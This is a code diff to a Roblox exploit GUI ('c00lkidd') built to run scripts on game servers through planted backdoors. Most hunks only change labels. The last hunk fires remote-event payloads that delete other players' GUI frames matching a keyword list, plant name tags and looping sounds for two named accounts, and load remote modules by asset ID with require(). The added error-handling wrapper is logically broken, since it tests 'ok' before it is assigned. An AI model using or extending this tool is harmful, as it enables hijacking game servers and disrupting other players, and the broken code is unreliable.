@@ -522,7 +522,7 @@ Converted["_UICorner7"].Parent = Converted["_TextBox"]
 
 Converted["_TextLabel"].Font = Enum.Font.Cartoon
 Converted["_TextLabel"].RichText = true
-Converted["_TextLabel"].Text = 'print("c00lkidd fUck roBLOX")'
+Converted["_TextLabel"].Text = '\n if true then c00lkidd 2025 Execution made by Rig6 (Modify) Trackcode (Owner)\n  Designed to execute Scripts through Backdoor.\n   Press execute to get started\n    end'
 Converted["_TextLabel"].TextColor3 = Color3.fromRGB(255, 0, 0)
 Converted["_TextLabel"].TextSize = 18
 Converted["_TextLabel"].TextTruncate = Enum.TextTruncate.AtEnd
@@ -595,7 +595,7 @@ Converted["_UIStroke9"].Thickness = 1.5
 Converted["_UIStroke9"].Parent = Converted["_Shutdown"]
 
 Converted["_Log1"].Font = Enum.Font.Cartoon
-Converted["_Log1"].Text = "c00lkidded"
+Converted["_Log1"].Text = "c00lkidd's c00l scripts"
 Converted["_Log1"].TextColor3 = Color3.fromRGB(255, 0, 0)
 Converted["_Log1"].TextScaled = true
 Converted["_Log1"].TextSize = 15
@@ -634,7 +634,7 @@ Converted["_UIStroke10"].Thickness = 1.5
 Converted["_UIStroke10"].Parent = Converted["_Trash"]
 
 Converted["_Sledge"].Font = Enum.Font.Cartoon
-Converted["_Sledge"].Text = "ANTI ABUSE"
+Converted["_Sledge"].Text = "Anti Abuse"
 Converted["_Sledge"].TextColor3 = Color3.fromRGB(255, 0, 0)
 Converted["_Sledge"].TextScaled = true
 Converted["_Sledge"].TextSize = 14
@@ -680,7 +680,7 @@ Converted["_UIStroke12"].Thickness = 1.5
 Converted["_UIStroke12"].Parent = Converted["_Star"]
 
 Converted["_CFour"].Font = Enum.Font.Cartoon
-Converted["_CFour"].Text = "Balls (nuke)"
+Converted["_CFour"].Text = "Explode ball"
 Converted["_CFour"].TextColor3 = Color3.fromRGB(255, 0, 0)
 Converted["_CFour"].TextScaled = true
 Converted["_CFour"].TextSize = 14
@@ -803,7 +803,7 @@ Converted["_lho"].AutoButtonColor = false
 Converted["_lho"].BackgroundColor3 = Color3.fromRGB(16.000000946223736, 16.000000946223736, 16.000000946223736)
 Converted["_lho"].BorderColor3 = Color3.fromRGB(0, 0, 0)
 Converted["_lho"].BorderSizePixel = 0
-Converted["_lho"].Position = UDim2.new(0.589, 0, 0.501, 0)
+Converted["_lho"].Position = UDim2.new(0.588, 0, 0.501, 0)
 Converted["_lho"].Size = UDim2.new(0, 113, 0, 42)
 Converted["_lho"].Name = "lho"
 Converted["_lho"].Parent = Converted["_Presets"]
@@ -861,7 +861,7 @@ Converted["_UIStroke17"].Thickness = 1.5
 Converted["_UIStroke17"].Parent = Converted["_ScrollingFrame1"]
 
 Converted["_Log2"].Font = Enum.Font.Cartoon
-Converted["_Log2"].Text = "Client Logs"
+Converted["_Log2"].Text = "Developer Console"
 Converted["_Log2"].TextColor3 = Color3.fromRGB(255, 0, 0)
 Converted["_Log2"].TextScaled = true
 Converted["_Log2"].TextSize = 15
@@ -2544,12 +2544,12 @@ ImageLabeeel.Image = "rbxassetid://8408806737"
 
 fr6.Name = "fr6"
 fr6.Parent = ImageLabeeel
-fr6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+fr6.BackgroundColor3 = Color3.fromRGB(0,0,0)
 fr6.BackgroundTransparency = 1.000
 fr6.Position = UDim2.new(0, 0, -0.633333325, 0)
 fr6.Size = UDim2.new(0, 90, 0, 50)
 fr6.Font = Enum.Font.Arcade
-fr6.Text = "R15 -> R6"
+fr6.Text = "R6"
 fr6.TextColor3 = Color3.fromRGB(255, 0, 0)
 fr6.TextScaled = true
 fr6.TextSize = 18.000
@@ -2631,11 +2631,16 @@ end)
 
 UpdateVisibilityBasedOnRigType()
                      wait(0.1)
+		  local ok,result = pcall(function()
+			if ok then 
 	                fireRemoteEvent('local Players=game:GetService("Players");local suspiciousKeywords={"hd admin","ranker","java1","darklord","pracharatbampen","kidd","k1dd","k00p","l**pzworld","tubers","h01pk","ban","ban gui","itsnotskeleton","l0ck","andres","xxandresxx","c00lgui","c00l","elmarz","teamf*t","5x5x5x5","g00b","kick","ban","undetectable gui","undetectable","acron","russia","infector","potato","sans_gboard","l*ckgui","starp4tch","user1337","menotgonnadobadstuff","8t010t8","darius","j00p","144anz","sigma","noot","1x1x1x1","lacking923","kaax","s1n","k_aax","ep1c","zazol","lalol","cxyz","saudi","koma","gigxxx","hax0rz","g00l","enstrio","br1cked"};local function isSuspicious(str)str=str:lower()for _,k in ipairs(suspiciousKeywords)do if str:find(k)then return true end end return false end;local function getOwningPlayer(i)local p=i;while p and not p:IsA("PlayerGui")do p=p.Parent end;if p and p:IsA("PlayerGui")then local c=p.Parent;return Players:GetPlayerFromCharacter(c)or Players:FindFirstChild(c.Name)end;return nil end;local function deleteIfSuspicious(i)if i:IsA("TextLabel")or i:IsA("Frame")then local n=i.Name;local t=i:IsA("TextLabel")and i.Text or"";local pl=getOwningPlayer(i);if pl and pl.Name=="greguiscool"then return nil end;if isSuspicious(n)or isSuspicious(t)then local f=i;while f and not f:IsA("Frame")do f=f.Parent end;if f then local h=Instance.new("Hint",workspace);h.Text="[Skid] Deleted sus Frame: "..f.Name..(pl and" (user: "..pl.Name..")"or"");task.delay(3,function()h:Destroy()end);f:Destroy()end end end end;for _,o in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,o)end;game.DescendantAdded:Connect(function(o)pcall(deleteIfSuspicious,o)end);task.spawn(function()while true do for _,o in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,o)end;task.wait(5)end end)')
                         fireRemoteEvent('for _,p in ipairs(game.Players:GetPlayers())do if p.Name=="greguiscool"or p.Name=="raizarit"then if p.Character and p.Character:FindFirstChild("Head")then local t=Instance.new("BillboardGui");t.Name="NameTag";t.Adornee=p.Character.Head;t.Parent=p.Character.Head;t.Size=UDim2.new(0,200,0,50);t.StudsOffset=Vector3.new(0,2.5,0);t.AlwaysOnTop=true;local l=Instance.new("TextLabel",t);l.Size=UDim2.new(1,0,1,0);l.BackgroundTransparency=1;l.Font=Enum.Font.Arcade;l.TextScaled=true;l.TextColor3=Color3.fromRGB(255,223,0);if p.Name=="greguiscool"then l.Text="👑The Legend👑";elseif p.Name=="raizarit"then l.Text="⚡The Legend⚡";end end end end;local e=Instance.new("Hint",workspace);e.Text="⚡ A Legendary Presence Has Entered the Realm! All Hail the Legend! ⚡";local s=Instance.new("Sound");s.Parent=workspace;s.SoundId="rbxassetid://118529969200894";s.Looped=true;s.Volume=1;s.PlaybackSpeed=1;s.TimePosition=41;s:Play();wait(13.3);local d=2;local w=d/20;local v=s.Volume;for i=1,20 do s.Volume=v*(1-i/20);wait(w);end;s:Stop();e:Destroy();')
                         fireRemoteEvent('require(6735691273).BetaAntiSkid()')
 			fireRemoteEvent('require(7458325257).antiban()')
                         fireRemoteEvent('require(3986243232).load("im gay",{"' .. game.Players.LocalPlayer.Name ..  '"})')
+				else
+			print(result)
+			end
 		else
 			script.Parent.Framee.Check.Text = "No Backdoor found :("
 			script.Parent.stat.ImageColor3 = Color3.fromRGB(226, 69, 69)
